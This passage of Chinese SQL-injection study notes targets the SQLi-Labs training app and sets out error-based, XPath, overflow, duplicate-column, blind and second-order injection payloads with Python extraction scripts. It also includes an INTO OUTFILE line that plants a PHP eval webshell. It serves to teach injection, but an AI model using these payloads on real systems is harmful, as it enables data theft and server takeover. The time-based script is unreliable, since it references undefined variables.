>
>    | `username`(主键) | `count(*)` |
>    | :--------------: | :--------: |
>    |      `jack`      |     1      |
>
> 3. 接着读取`users`表的第二行，执行`username`表达式，得到值`jack`，发现临时表主键中已经有`jack`这一项了，于是`count(*)`自增：
>
>    | `username`(主键) | `count(*)` |
>    | :--------------: | :--------: |
>    |      `jack`      |     2      |
>
> 4. 接着读取`users`表的第一行，执行`username`表达式，得到值`tom`，发现临时表的主键中没有`tom`这一项，于是创建一行：
>
>    | `username`(主键) | `count(*)` |
>    | :--------------: | :--------: |
>    |      `jack`      |     2      |
>    |      `tom`       |    `1`     |
>
> 上述步骤十分的正常。我们知道主键不能重复，而上述的流程保证了“如果主键已经存在，则不再创建重复的主键”。有没有一种方法，能欺骗程序“假装主键不存在，实际上存在”呢？也就是说，我们想让同一个表达式在“判断阶段”与“添加阶段”的值不一样。这里我们就需要用到`RAND()`函数。
>
> 我们知道，`RAND([seed])`函数能随机返回一个`[0,1)`内的浮点数，并提供一个可选的随机数种子参数`seed`。使用`FLOOR()`函数可以创造一个二项分布随机变量：`FLOOR(RAND(0)*2)`。
>
> ```sql
> mysql> select rand(0) from users;
> +---------------------+
> | rand(0)             |
> +---------------------+
> | 0.15522042769493574 |
> |   0.620881741513388 |
> |  0.6387474552157777 |
> | 0.33109208227236947 |
> |  0.7392180764481594 |
> |  0.7028141661573334 |
> |  0.2964166321758336 |
> |  0.3736406931408129 |
> |  0.9789535999102086 |
> |  0.7738459508622493 |
> |  0.9323689853142658 |
> |  0.3403071047182261 |
> |  0.9044285983819781 |
> +---------------------+
> 13 rows in set (0.00 sec)
> 
> mysql> select rand(0),floor(rand(0)*2) from users;
> +---------------------+------------------+
> | rand(0)             | floor(rand(0)*2) |
> +---------------------+------------------+
> | 0.15522042769493574 |                0 |
> |   0.620881741513388 |                1 |
> |  0.6387474552157777 |                1 |
> | 0.33109208227236947 |                0 |
> |  0.7392180764481594 |                1 |
> |  0.7028141661573334 |                1 |
> |  0.2964166321758336 |                0 |
> |  0.3736406931408129 |                0 |
> |  0.9789535999102086 |                1 |
> |  0.7738459508622493 |                1 |
> |  0.9323689853142658 |                1 |
> |  0.3403071047182261 |                0 |
> |  0.9044285983819781 |                1 |
> +---------------------+------------------+
> 13 rows in set (0.00 sec)
> ```
>
> 这说明`floor(rand(0)*2)`这个序列为`[0,1,1,0,1,1,......]`
>
> 现在我们考虑这个SQL语句：`SELECT count(*) FROM users GROUP BY floor(rand(0)*2)`：
>
> 1. 执行`SELECT count(*) FROM users GROUP BY floor(rand(0)*2)`，首先MySQL会创建一张临时表：
>
>    | `floor(rand(0)*2)`(主键) | `count(*)` |
>    | ------------------------ | ---------- |
>
> 2. 接着读取`users`表的第一行，执行`floor(rand(0)*2)`表达式，得到值`0`，发现临时表的主键中没有`0`这一项，于是创建一行，新增的这一行的主键为`1`：
>
>    | `floor(rand(0)*2)`(主键) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     1      |
>
> 3. 接着读取`users`表的第二行，执行`floor(rand(0)*2)`表达式，得到值`1`，发现临时表主键中已经有`1`这一项了，于是不再尝试新增一行，也不会重新计算表达式，而是直接让`count(*)`自增：
>
>    | `floor(rand(0)*2)`(主键) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     2      |
>
> 4. 接着读取`users`表的第一行，执行`floor(rand(0)*2)`表达式，得到值`0`，发现临时表的主键中没有`0`这一项，于是尝试创建一行，重新计算一遍表达式，得到`1`，并将其作为新增行的主键：
>
>    | `floor(rand(0)*2)`(主键) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     2      |
>    |           `1`            |     1      |
>
> 至此问题出现了——不能重复的主键竟然重复了！MySQL敏锐地察觉到了这一问题，并且阻止程序添加新行，于是程序会爆出`ERROR 1062 (23000): Duplicate entry '<ColumnNameWithRAND()>' for key 'group_key'`的错误。其中`<ColumnNameWithRAND()>`是所需表达式执行后的结果，利用这一点可以实现错误注入。
>
> ```sql
> SELECT CONCAT((SELECT database()),floor(rand()*2)) AS something
> 	FROM INFORMATION_SCHEMA.TABLES
> 	WHERE TABLE_SCHEMA='security';
> 			+-----------+
> 			| something |
> 			+-----------+
> 			| security0 |
> 			| security0 |
> 			| security1 |
> 			| security0 |
> 			+-----------+
> SELECT CONCAT((SELECT database()),floor(rand()*2)) AS something
> 	FROM INFORMATION_SCHEMA.TABLES
> 	WHERE TABLE_SCHEMA='security'
> 	GROUP BY something;
> 			+-----------+
> 			| something |
> 			+-----------+
> 			| security0 | 
> 			| security1 |
> 			+-----------+
> -- 执行下列语句会得到不同的结果，自检得到成功频率=41/80，失败频率=39/80，大概五五开
> SELECT
> 	COUNT(*),
> 	CONCAT((SELECT database()),floor(rand()*2)) AS something
> 	FROM INFORMATION_SCHEMA.TABLES
> 	WHERE TABLE_SCHEMA='security'
> 	GROUP BY something;
> 			-- ERROR 1062 (23000): Duplicate entry 'security0' for key 'group_key'
> 		或者
> 			+----------+-----------+
> 			| COUNT(*) | something |
> 			+----------+-----------+
> 			|        2 | security0 | # 爆database()
> 			|        2 | security1 |
> 			+----------+-----------+
> ```
>
> 分析以上过程，我们不难发现这种错误有以下前提条件：
>
> 1. 要挑选合适的种子，使得`floor(rand()*2)`生成的随机数序列在让临时表穷尽所有可能性之前发生主键重复错误
>
>    例如`rand(1)`会导致`floor(rand()*2)`输出的序列为`0,1,0,0`，重复上述步骤，
>
>    | `floor(rand(1)*2)`(主键) | `count(*)` |
>    | :----------------------: | :--------: |
>
>    | `floor(rand(1)*2)`(主键) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     1      |
>
>    | `floor(rand(1)*2)`(主键) | `count(*)` |
>    | :----------------------: | :--------: |
>    |           `1`            |     1      |
>    |           `0`            |     1      |
>
>    此时表内的记录都齐全了，随便取一个随机数都能在表中找到对应的行，所以之后的数据都是直接让`count(*)`自增，不会进行到插入新行的这一步，因此不会产生主键重复报错。
>
> 2. .表内数据必须大于等于两行
>
>    显然临时表中必须现有一行，才能以其作为参照进行主键碰撞。例如`floor(rand(14)*2)`产生的``[1,0,1,0,...]`。

常见的Payload为：`1' union select 1 from (select count(*),concat((SELECT语句),floor(rand(0)*2))x from 记录数大于等于二的表 group by x)y`

> 注意：能不能用`1' union select count(*),concat((SELECT语句),floor(rand(14)*2)) as a from 记录数大于等于二的表 group by a`作为Payload呢？答案是不行。
>
> 经过实测，当`SELECT语句`比较简短时（例如`select user()`、`select database()`，甚至是`select concat(user(),database())`），上述规律依然适用，也会导致逐渐重复而执行Payload。
>
> 然而，当`SELECT语句`包含`group_concat()`（例如`SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'`），上述规律完全失效。容易验证：当`GROUP BY`尝试向临时表增加新行时，使用的主键不是再次执行表达式得到的值，而是上次用于判断临时表中是否存在主键重复用的值。也就是说，判断主键是否重复用的是什么值，增加新行用到的主键就是什么值。这彻底破坏了主键重复注入的可能性。
>
> 我们知道，要把搜索结果通过报错信息输出，我们的子查询的结果就只能有一行。要做到这一点，除了使用`group_concat()`之外，其它[WriteUp](https://blog.csdn.net/silence1_/article/details/90812612)中也提到可以使用`LIMIT`子句（例如`SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' LIMIT 0,1`）。这种方法稳定有效。
>
> 笔者推测，这可能是因为`LIMIT`毕竟是把多行砍成一行，而`group_concat()`直接就只是一行。但是这种解释不能令人信服。只能期待有无C++大手子分析一下MySQL源码了。😅

### §3.1.2 XPath注入

MySQL内部定义了两个与XML相关的函数——`ExtractValue()`与`UpdateXML()`。（大小写不敏感）

- `ExtractValue(xml_frag, xpath_expr)`根据XPath表达式`xpath_expr`从XML字符串`xml_frag`中提取值：

  ```sql
  mysql> SET @xmlString = '<html><body><a>First</a><a>Second</a></body></html>';
  
  mysql> SELECT 1,EXTRACTVALUE(@xmlString,'/html/body/a[1]');
  +---+--------------------------------------------+
  | 1 | EXTRACTVALUE(@xmlString,'/html/body/a[1]') |
  +---+--------------------------------------------+
  | 1 | First                                      |
  +---+--------------------------------------------+
  1 row in set (0.00 sec)
  
  mysql> SELECT 2,EXTRACTVALUE(@xmlString,'/html/body/a[2]');
  +---+--------------------------------------------+
  | 2 | EXTRACTVALUE(@xmlString,'/html/body/a[2]') |
  +---+--------------------------------------------+
  | 2 | Second                                     |
  +---+--------------------------------------------+
  1 row in set (0.00 sec)
  
  mysql> SELECT 2,EXTRACTVALUE(@xmlString,'//a[2]');
  +---+-----------------------------------+
  | 2 | EXTRACTVALUE(@xmlString,'//a[2]') |
  +---+-----------------------------------+
  | 2 | Second                            |
  +---+-----------------------------------+
  1 row in set (0.00 sec)
  ```

- `UpdateXML(xml_target, xpath_expr, new_xml)`在XML字符串`xml_target`中寻找匹配XPath表达式`xpath_expr`的所有部分，并将其替换为`new_xml`：

  ```sql
  mysql> select UpdateXML('<a><b>ccc</b><d></d></a>', '/a', '<e>fff</e>'); # 匹配根标签
  +-----------------------------------------------------------+
  | UpdateXML('<a><b>ccc</b><d></d></a>', '/a', '<e>fff</e>') |
  +-----------------------------------------------------------+
  | <e>fff</e>                                                |
  +-----------------------------------------------------------+
  
  mysql> select UpdateXML('<a><b>ccc</b><d></d></a>', '//b', '<e>fff</e>'); # 匹配字标签
  +------------------------------------------------------------+
  | UpdateXML('<a><b>ccc</b><d></d></a>', '//b', '<e>fff</e>') |
  +------------------------------------------------------------+
  | <a><e>fff</e><d></d></a>                                   |
  +------------------------------------------------------------+
  1 row in set (0.00 sec)
  
  mysql> select UpdateXML('<a><b>ccc</b><b>ccc</b><d></d></a>', '//b', '<e>fff</e>'); # 多匹配项
  +----------------------------------------------------------------------+
  | UpdateXML('<a><b>ccc</b><b>ccc</b><d></d></a>', '//b', '<e>fff</e>') |
  +----------------------------------------------------------------------+
  | <a><b>ccc</b><b>ccc</b><d></d></a>                                   |
  +----------------------------------------------------------------------+
  1 row in set (0.00 sec)
  ```

当XPath表达式`xpath_expr`不符合语法时，MySQL将输出处理后的XPath表达式并报错。当这一变量完全可控时，我们就可以构造相应的恶意表达式来爆库。为了让XPath表达式不符合语法，我们可以使用`~`、`0x0a`这类特殊字符：

```sql
mysql> SELECT * FROM users WHERE id='1' and extractvalue('kk',concat('~',(select database())));
ERROR 1105 (HY000): XPATH syntax error: '~security'

mysql> select * from users where id='1' and updatexml('anything',concat('~',(select database())),'anything');
ERROR 1105 (HY000): XPATH syntax error: '~security'
```

> 注意：XPath表达式在XML字符串中找不到指定的元素时，并不会报错，而是默认隐藏警告，并且令函数返回`NULL`，只有通过`SHOW WARNINGS`语句才能看到。因此，这种XPath表达式依然符合语法，MySQL的函数也不会报错。
>
> 为了让XPath表达式真正的非法，从而让函数报错，我们需要在XPath表达式中加入非法字符。经实测，所有非法字符如下所示：
>
> ```python
> import requests
> 
> url = "http://localhost/SQLi-Labs/Less-5/?id=1' and extractvalue('',concat({},(select database())))--+"
> 
> for i in range(0,256):
>     hexChar = hex(i)
>     currentUrl = url.format(hexChar)
>     result = requests.get(currentUrl)
>     if "syntax error" in result.text:
>         print("{} extractvalue()报错".format(hexChar))
>     else: # 什么也没有
>         print("{} extractvalue()返回NULL".format(hexChar))
> /*
>     0x0~0x1f
>         (缺0x20:空格)
>     0x21~0x23:
>     `	(缺0x24:$)
>     0x25~0x2c
>         (缺0x2d:-)
>     0x2e:.
>         (缺0x2f:/)
>     0x30~0x3f:?
>         (缺0x40:@和0x41~0x5a的所有大写祖母)
>     0x5b~0x5e
>         （缺0x5f:_）
>     0x60:`
>         (缺0x61-0x7a的所有小写字母)
>     0x7b~0xff
> */
> ```

> 注意：经过实测，报错信息只能返回32个字符。再扣除一个非法字符，能返回的只有31个字符：
>
> ```sql
> mysql> select group_concat(password) from users;
> +--------------------------------------------------------------------------------------------------+
> | group_concat(password)                                                                           |
> +--------------------------------------------------------------------------------------------------+
> | Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 |
> +--------------------------------------------------------------------------------------------------+
> 
> mysql> SELECT * FROM users WHERE id='0' and extractvalue(0x0a,concat(0x0a,(select group_concat(password) from users)));
> ERROR 1105 (HY000): XPATH syntax error: ' Dumb,I-kill-you,p@ssword,crappy'
> ```
>
> 为了获取到完整的信息，我们对字符串进行截取，分段获取每部分，最终拼接到一起：
>
> - `left(列名,长度)`与`right(列名,长度)`
>
>   ```sql
>   ?id=1'^extractvalue(1,concat(0x7e,(select(left(password,30))from(表名))))%23
>   
>   ?id=1'^extractvalue(1,concat(0x7e,(select(right(password,30))from(表名))))%23
>   ```
>
> - `substring()`
>
>   只能使用`substring()`、`substr()`、`left()`、`right()`、`regexp()`等函数分批次获取：？？？？？？？？？？TODO：？？？
>
>   ```
>                       
>   ```
>
>   

> 注意：当且仅当`ExtractValue()`与`UpdateXML()`的返回值被当作布尔表达式应用于`WHERE`子句时，XPath表达式才会被解析到最终形态：
>
> ```sql
> // extractvalue()作为Select子句的列名时，不会被处理
> mysql> SELECT EXTRACTVALUE("anything",concat(~,(select database())));
> ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(select database())))' at line 1
> ```

### §3.1.3 大数溢出注入

> 注意：溢出注入依赖于特定的MySQL版本——
>
> - MySQL < 5.5，整形溢出不会报错，本方法无效
> - 5.5.5 < MySQL < 5.5.47，整形溢出会报错，能够执行并返回payload，本方法生效
> - MySQL > 5.5.53，整形溢出会报错，但不会执行并返回payload，本方法失效

MySQL默认使用的整数类型是无符号型`BIGINT`，占用8个字节，最大值为$2^{64}-1=18446744073709551615$。

```sql
mysql> select 18446744073709551615;
+----------------------+
| 18446744073709551615 |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select 18446744073709551616;
+----------------------+
| 18446744073709551616 |
+----------------------+
| 18446744073709551616 |
+----------------------+
1 row in set (0.00 sec)

mysql> select 18446744073709551615 + 1;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(18446744073709551615 + 1)'
```

我们也可以对`0`按位取反，快速得到最大值：

```sql
mysql> select ~0;
+----------------------+
| ~0                   |
+----------------------+
| 18446744073709551615 |
+----------------------+
1 row in set (0.00 sec)

mysql> select ~0 + 1;
    ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '(~(0) + 1)'
```

我们知道，如果一个`SELECT`子句执行成功，那么它的返回值可以视为`0`：

```sql
mysql> select (select user());
+-----------------+
| (select user()) |
+-----------------+
| root@localhost  |
+-----------------+
1 row in set (0.00 sec)

mysql> select !(select user()); # 一次取反
+------------------+
| !(select user()) |
+------------------+
|                1 |
+------------------+
1 row in set (0.00 sec)

mysql> select !(select !(select user())); # 二次取反
+----------------------------+
| !(select !(select user())) |
+----------------------------+
|                          0 |
+----------------------------+
1 row in set (0.00 sec)
```

最终构建payload：

```sql
mysql> select (select(!x-~0)from(select(select user())x)a); # x与a均省略AS关键字
ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in '((not('root@localhost')) - ~(0))'
```

### §3.1.4 列名重复注入

我们知道，一个表（`Table`）不允许包含两个名称相同的字段，但是一个子查询（`Subquery`）是可以的。如果我们把子查询看作一个表，作为`FROM`子句的参数，那么就会导致错误。这里我们使用`NAME_CONST(name,value)`函数创建临时列：

```sql
mysql> select * from (select NAME_CONST('HelloWorld',1),NAME_CONST('HelloWorld',2));
    ERROR 1248 (42000): Every derived table must have its own alias # 报错，子查询作为表时必须指定别名

mysql> select * from (select NAME_CONST('HelloWorld',1),NAME_CONST('HelloWorld',2)) AS x;
    ERROR 1060 (42S21): Duplicate column name 'HelloWorld' # HelloWorld被爆出来了

mysql> select * from (select NAME_CONST('HelloWorld',1),NAME_CONST('HelloWorld',2))x; # 也可以忽略AS关键字
    ERROR 1060 (42S21): Duplicate column name 'HelloWorld'
```

我们发现错误信息中包含重复的列名。利用这一点，我们可以将payload放入列名中：

```sql
# 爆数据库版本
mysql> select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
    ERROR 1060 (42S21): Duplicate column name '5.5.53'
```

然而高版本的[官方文档](https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const)明确表示，`name_const()`函数中的所有参数只能为常量，因此无法执行任意payload，所以该方法只适用于低版本（>5.0.12）：

> - `NAME_CONST(name,value)`
>
>   Returns the given value. When used to produce a result set column, NAME_CONST() causes the column to have the given name. **<u>The arguments should be constants</u>**.

既然`name_const()`行不通，那我们就试试用其他方法获取列名。例如每张表的列名就是现成的列名，我们可以爆列名：

```sql
mysql> select * from users a join users b; # 构建含有重复列名的Subquery
+----+----------+------------+----+----------+------------+
| id | username | password   | id | username | password   |
+----+----------+------------+----+----------+------------+
|  1 | Dumb     | Dumb       |  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |  1 | Dumb     | Dumb       |
| .. | ......   | ......     | .. | ......   | ......     |
| 14 | admin4   | admin4     | 14 | admin4   | admin4     |
+----+----------+------------+----+----------+------------+

mysql> select * from (select * from users a join users b) c;
	ERROR 1060 (42S21): Duplicate column name 'id' # 爆出一个名为id的字段
```

但是这样只能爆出一个字段。于是我们使用`USING`子句删除已知名称的字段：

```sql
mysql> select * from users a join users b using(id);
+----+----------+------------+----------+------------+
| id | username | password   | username | password   |
+----+----------+------------+----------+------------+
|  1 | Dumb     | Dumb       | Dumb     | Dumb       |
| .. | ......   | ......     | ......   | ......     |
| 14 | admin4   | admin4     | admin4   | admin4     |
+----+----------+------------+----------+------------+
13 rows in set (0.00 sec)

mysql> select * from users a join users b using(id,username);
+----+----------+------------+------------+
| id | username | password   | password   |
+----+----------+------------+------------+
|  1 | Dumb     | Dumb       | Dumb       |
| .. | ......   | ......     | ......     |
| 14 | admin4   | admin4     | admin4     |
+----+----------+------------+------------+
13 rows in set (0.00 sec)

mysql> select * from users a join users b using(id,username,password);
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
| .. | ......   | ......     |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)
```

这样我们就可以逐个爆出所有的列名了：

```sql
mysql> select * from (select * from users a join users b) c;
    ERROR 1060 (42S21): Duplicate column name 'id' # 爆出列名id

mysql> select * from (select * from users a join users b using(id)) c;
    ERROR 1060 (42S21): Duplicate column name 'username' # 爆出列名username

mysql> select * from (select * from users a join users b using(id,username)) c;
    ERROR 1060 (42S21): Duplicate column name 'password' # 爆出列名password

mysql> select * from (select * from users a join users b using(id,username,password)) c;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
| .. | ........ | .......... |
| 14 | admin4   | admin4     |
+----+----------+------------+ # 不报错，说明列名全都爆完了
```

### §3.1.5 `abs()`大数溢出注入

> 注意：本注入方法只适用于SQLite，不适用于MySQL和MariaDB。

[SQLite的官方文档-函数列表](https://www.sqlite.org/lang_corefunc.html)中提到了`abs()`函数的特性：

> - abs(X)
>
>   The abs(X) function returns the absolute value of the numeric argument X. Abs(X) returns NULL if X is NULL. Abs(X) returns 0.0 if X is a string or blob that cannot be converted to a numeric value. If X is the integer -9223372036854775808 then abs(X) throws an integer overflow error since there is no equivalent positive 64-bit two complement value.
>
>   abs(X)函数用于返回参数X的绝对值。参数X为`NULL`时返回值也为`NULL`；参数X为字符串或无法转换为数字的张量时返回值为`0.0`；参数X为`-2^63`时抛出整数溢出错误。（实际上，

`abs()`涉及到正负号转换，因此使用的是64位有符号整数。官方文档尚未指出的一点是，经实测：当参数X大于等于`0x8000000000000000`时就会报错。

```sqlite
sqlite> select abs(0x7fffffffffffffff);
9223372036854775807

sqlite> select abs(0x8000000000000000);
Runtime error: integer overflow

sqlite> select abs(0x7fffffffffffffff + 1);
9.22337203685478e+18
```

报错提示指出这是一个`Runtime Error`，并非编译时错误。这意味着我们可以根据某些可控的条件，有选择性的运行大数，根据报错与否判断条件是否成立：

```sqlite
sqlite> select iif(1,123456,abs(0x8000000000000000));
123456

sqlite> select iif(0,123456,abs(0x8000000000000000));
Runtime error: integer overflow
```

> MariaDB与MySQL的`abs()`均没有大数溢出报错，其行为如下所示：
>
> - MariaDB：超过`0x8000000000000000`时，将会被视为负数，相当于以有符号数的规则读取无符号数。
>
>   ```mariadb
>   MariaDB [(none)]> select abs(0x7FFFFFFFFFFFFFFF);
>   +-------------------------+
>   | ABS(0x7FFFFFFFFFFFFFFF) |
>   +-------------------------+
>   |     9223372036854775807 |
>   +-------------------------+
>   
>   MariaDB [(none)]> select abs(0x7FFFFFFFFFFFFFFF + 1);
>   +-----------------------------+
>   | abs(0x7FFFFFFFFFFFFFFF + 1) |
>   +-----------------------------+
>   |         9223372036854775808 |
>   +-----------------------------+
>   
>   MariaDB [(none)]> select abs(0x8000000000000000);
>   +-------------------------+
>   | abs(0x8000000000000000) |
>   +-------------------------+
>   |    -9223372036854775808 |
>   +-------------------------+
>   ```
>
> - MySQL：超过`0x8000000000000000`时，返回值完全不可预测。在一段区间内稳定不动，在另一区间内返回无规律大数。
>
>   ```mysql
>   mysql> select abs(0x7fffffffffffffff);
>   +-------------------------+
>   | abs(0x7fffffffffffffff) |
>   +-------------------------+
>   |     9223372036854776000 |
>   +-------------------------+
>                     
>   mysql> select abs(0x8000000000000000);
>   +-------------------------+
>   | abs(0x8000000000000000) |
>   +-------------------------+
>   |     9223372036854776000 |
>   +-------------------------+
>                     
>   mysql> select abs(0x7fffffffffffffff + 1);
>   +-----------------------------+
>   | abs(0x7fffffffffffffff + 1) |
>   +-----------------------------+
>   |         9223372036854776000 |
>   +-----------------------------+
>                     
>   mysql> select abs(0xFFFFFFFFFFFFFFFF);
>   +-------------------------+
>   | abs(0xFFFFFFFFFFFFFFFF) |
>   +-------------------------+
>   |    18446744073709552000 |
>   +-------------------------+
>   ```

？？？？？[HarekazeCTF2019]Sqlite Voting TODO：？？？？？？？

https://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB%E9%A2%98%E8%A7%A3/#Sqlite-Voting

## §3.2 文件注入

> 注意：该注入需要确保`secure_file_priv`的值非`NULL`，详见[§1.2.7 MySQL的`secure_file_priv`参数](#§1.2.7 MySQL的`secure_file_priv`参数)一节。

构造PHP WebShell：

```sql
?id=1')) union select null,0x3c3f70687020406576616c28245f504f53545b277368656c6c275d293b203f3e,null into outfile '/var/www/html/shell.php' --+
```

## §3.3 盲注（Bind Inject）

### §3.3.1 布尔盲注（Boolean Based）

如果成功与失败均无回显，但是查询成功/失败的特征差别非常显著，可以考虑使用布尔盲注。

下面是一个用于获取数据库名的脚本，使用穷举法。令数据库名长度为$m$，ASCII码取值范围为$n$，则时间复杂度为$O(mn^2)$：

```python
import requests

MAX_FILED_LENGTH = 20
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"

databaseLength = 0
URL = URL_PREFIX + "?id=1' and length(database())={} --+"
for filedLength in range(1,MAX_FILED_LENGTH+1):
    result = requests.get(URL.format(filedLength))
    if "You are in..........." in result.text:
        databaseLength = filedLength
        print("数据库名长度共{}位".format(filedLength))
        break

databaseName = ""
URL = URL_PREFIX + "?id=1' and ascii(substr((select database()),{},1)) = {}--+"
for filedLength in range(1, databaseLength+1):  # substr()是从1开始数的，而不是0
    for characterAscii in range(0, 128):
        result = requests.get(URL.format(filedLength, characterAscii))
        if "You are in..........." in result.text:
            databaseName += chr(characterAscii)
            print(databaseName)
            break
```

为了加快搜索速度，我们常用二分查找，时间复杂度为$O(m\log_2{n})$：

```python
import requests

MAX_FILED_LENGTH = 20
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"

databaseLengthRange = [1,MAX_FILED_LENGTH]
URL = URL_PREFIX + "?id=1' and length(database())>{} --+"
while databaseLengthRange[0] != databaseLengthRange[1]:
    currentDatabaseLength = sum(databaseLengthRange) // 2
    if "You are in..........." in requests.get(URL.format(currentDatabaseLength)).text:
        databaseLengthRange[0] = currentDatabaseLength + 1
        continue
    else:
        databaseLengthRange[1] = currentDatabaseLength
        continue
databaseLength = databaseLengthRange[0]
print("数据库名的长度为{}位".format(databaseLength))

databaseName = ""
URL = URL_PREFIX + "?id=1' and ascii(substr((select database()),{},1)) > {}--+"
for filedLength in range(1, databaseLength+1):  # substr()是从1开始数的，而不是0
    characterAsciiRange = [0,127]
    while characterAsciiRange[0] != characterAsciiRange[1]:
        currentCharacterAscii = sum(characterAsciiRange) // 2
        if "You are in..........." in requests.get(URL.format(filedLength, currentCharacterAscii)).text:
            characterAsciiRange[0] = currentCharacterAscii + 1
            continue
        else:
            characterAsciiRange[1] = currentCharacterAscii
            continue
    databaseName += chr(characterAsciiRange[0])
    print(databaseName)
```

我们还可以对上述逻辑封装成一个通用的函数：

```python
import requests

MAX_FILED_LENGTH = 20
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"


def getBinarySearchResult(url: str, paramRange: list[int], successInfo: str) -> int:
    """
        url : 形如...>{}的链接
        paramRange : [参数的最小值,参数的最大值]
        successInfo : 成功时的回显内容
    """
    while paramRange[0] != paramRange[1]:
        tempParam = sum(paramRange) // 2
        result = requests.get(url.format(tempParam)).text
        if successInfo in result:
            paramRange[0] = tempParam + 1
            continue
        else:
            paramRange[1] = tempParam
            continue
    return paramRange[0]


databaseNameLength = getBinarySearchResult(
    URL_PREFIX + "?id=1' and length(database())>{} --+",
    [1, MAX_FILED_LENGTH],
    "You are in..........."
)
print("数据库名的长度为{}位".format(databaseNameLength))

databaseName = ""
for i in range(1, databaseNameLength+1):
    databaseName += chr(getBinarySearchResult(
        URL_PREFIX + "?id=1' and ascii(substr((任意只有一行的SELECT子句)," + str(i) + ",1)) > {} --+",
        [0, 128],
        "You are in..........."
    ))
    print(databaseName)
```

### §3.3.2 时间盲注（Time Based）

如果成功与失败均无回显，并且查询成功/失败的特征没有任何差别，可以考虑使用时间盲注。

```python
import requests
import time

MAX_FILED_LENGTH = 40
URL_PREFIX = "http://localhost/SQLi-Labs/Less-8/"
SLEEP_TIME = 0.5 # 根据实际网络环境适当调大


def getBinarySearchResultByTime(url: str, paramRange: list[int], sleepTime: float)->int:
    """
        url : 形如...>{}的链接
        paramRange : [参数的最小值,参数的最大值]
        sleepTime : 成功时的睡眠时间
    """
    while paramRange[0] != paramRange[1]:
        tempParam = sum(paramRange) // 2
        startTime = time.perf_counter()
        result = requests.get(url.format(tempParam)).text
        endTime = time.perf_counter()
        if(endTime-startTime>sleepTime):
            paramRange[0] = tempParam + 1
        else:
            paramRange[1] = tempParam
    return paramRange[0]

data = ""
for i in range(1, databaseNameLength+1):
    databaseName += chr(getBinarySearchResultByTime(
        URL_PREFIX + "?id=1' and if(ascii(substr((SELECT语句)," + str(i) + ",1)) > {},sleep("+str(SLEEP_TIME)+"),1) --+",
        [0, 128],
        SLEEP_TIME
    ))
    print(data)
```

## §3.4 堆叠注入

## §3.5 预处理注入

我们知道，SQL语句分为两类——即时SQL与预处理（Prepared Statement）SQL。预处理SQL可以将语句中的参数换成占位符，使其模板化，这样就不必每次都执行一遍语法解析，可以提高执行效率：

```mysql
mysql> PREPARE statement FROM 'SELECT * FROM users WHERE id=?';
Query OK, 0 rows affected (0.00 sec)
Statement prepared

mysql> set @id = 1;
Query OK, 0 rows affected (0.00 sec)

mysql> EXECUTE statement USING @id;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | 123      |
+----+----------+----------+
1 row in set (0.00 sec)
```

SQL中要表示一个字符串，既可以使用引号包裹其内容，也可以将其十六进制形式赋给一个变量，该变量会将十六进制数隐式转换为字符串：

```mysql
mysql> set @a = 0x53454c454354202a2046524f4d2075736572732057484552452069643d3f;
Query OK, 0 rows affected (0.00 sec)

mysql> select @a;
+--------------------------------+
| @a                             |
+--------------------------------+
| SELECT * FROM users WHERE id=? |
+--------------------------------+
1 row in set (0.00 sec)
```

于是我们可以借助十六进制字符串绕过WAF：

```mysql
mysql> set @a = 0x53454c454354202a2046524f4d2075736572732057484552452069643d3f;
Query OK, 0 rows affected (0.00 sec)

mysql> PREPARE statement FROM 0x53454c454354202a2046524f4d2075736572732057484552452069643d3f; # 不能绕过赋值这一步！
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '0x53454c454354202a2046524f4d2075736572732057484552452069643d3f' at line 1

mysql> PREPARE statement FROM @a;
Query OK, 0 rows affected (0.00 sec)
Statement prepared
```

## §3.6 正则注入

## §3.7 二次注入

设想以下用户系统：

```php
$username = addslashes($_POST['username']); # 用户名
$password = md5($_POST['password']); # 密码
$info = addslashes($_POST['info']); # 个人简介

# 添加用户
$sql = "insert into users(username,password,info) values ('{$username}','{$password}','未定义个人简介');"

# 登录用户
$sql = "select * from users where username='{$username}' and password='{$password}';"
if($res = mysql_fetch_assoc(mysql_query($sql))){
	$_SESSION['username'] = $res['username'];
}

# 查看个人简介
$sql = "select info from us ers where username='{$_SESSION['username']}';";
echo mysql_fetch_assoc(mysql_query($sql))['info'];

# 修改个人简介
$sql = "update users set info='{$info}' where username='{$_SESSION['username']}';";
```

分析以下Payload：

```php
$_POST['username'] = "1' union select database() #"
$_POST['password'] = ......;
$_POST['info'] = ......;
```

第一个SQL语句负责创建用户。由于`$username`会用到`addslashes()`进行转义，所以拼接得到的SQL语句中会包含大量的`\`。数据库执行时，又会将`\`视为转义标识符，而非`\`字符本身，所以数据库中存储的是原封不动的`1' union select database() #`。

第二个SQL语句负责登录用户。由于数据库中的`username`字段未经转义，所以`$_SEESION['username']`中存储的也是未经转义的用户名。

